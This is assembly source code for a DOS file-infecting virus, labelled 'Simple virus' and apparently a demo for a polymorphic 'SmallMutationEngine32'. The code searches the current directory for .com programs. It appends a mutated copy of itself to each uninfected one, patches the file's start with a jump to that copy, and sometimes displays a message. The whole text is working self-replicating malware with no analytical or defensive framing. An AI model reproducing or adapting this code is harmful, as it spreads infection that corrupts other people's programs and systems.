   ; Simple virus.

   .model tiny
   .386
   .code
       org 0h
   main:   call getbp
   getbp:  pop si
       sub si,offset getbp
       xor di,di
       mov ax,cs
       add ax,1000h
       mov es,ax
       mov cx,vlen
   rep movsb
       push es
       mov ax,offset HighEntry
       push ax
       retf
   CMask   db  '*.com',0
   Old db  0Cdh,20h,0,0
       db  'SmallMutationEngine32 ViRUS Demo.',10,13,'$'
   HighEntry:
       push ds

       push cs ds
       pop  es ds

       mov si,offset old
       mov di,100h
       push di
       movsw
       movsw

       push es es

       push cs
       pop  es

       push cs
       pop  ds

       Call Randomize

       mov ah,1ah
       mov dx,offset dta
       int 21h
       mov ah,4Eh
       mov dx,offset CMask
       xor cx,cx
   FFile:  int 21h
       jb Quit
       mov ax,3d02h
       mov dx,offset FName
       int 21h
       jb NFile
       xchg ax,bx
       mov ah,3fh
       mov dx,offset Old
       mov cx,4
       int 21h
       cmp [Old][3],'V'
       jz CFile
       mov ax,4202h
       xor cx,cx
       cwd
       int 21h
       push ax

       mov di,offset Free
       xor si,si
       mov cx,vlen
       Call SMm32
       mov dx,di
       mov ah,40h
       int 21h
       mov ax,4200h
       xor cx,cx
       cwd
       int 21h
       pop ax
       sub ax,3
       mov template,ax
       mov ah,40h
       mov dx,offset template-1
       mov cx,4
       int 21h
   CFile:  mov ah,3eh
       int 21h
   NFile:  mov ah,4Fh
       jmp FFile
   Quit:   mov ax,20
       call getrnd
       or ax,ax
       jne NoShow
       mov ah,9
       mov dx,offset Old+4
       int 21h
   NoShow:
       pop es ds
       retf
           db  0E9h
   Template    dw  ?
           db  'V'
   Include SMm32.inc
   Vlen    equ $ - Main
   Include SMm32.dat
   Dta db  21 dup (?)
       dw  ?
       dw  ?
       db  ?
       dd  ?
   Fname   db  13 dup (?)
   Free:

   end main
